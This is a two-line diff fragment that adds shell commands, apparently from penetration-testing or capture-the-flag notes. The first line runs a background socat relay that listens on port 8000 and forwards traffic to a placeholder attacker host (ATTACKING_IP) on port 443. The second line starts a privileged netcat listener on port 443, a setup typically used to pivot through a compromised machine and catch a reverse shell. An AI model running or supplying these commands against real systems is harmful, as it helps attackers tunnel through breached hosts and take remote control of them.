@@ -1,0 +1,2 @@
+./socat tcp-l:8000 tcp:ATTACKING_IP:443 &
+sudo nc -lvnp 443
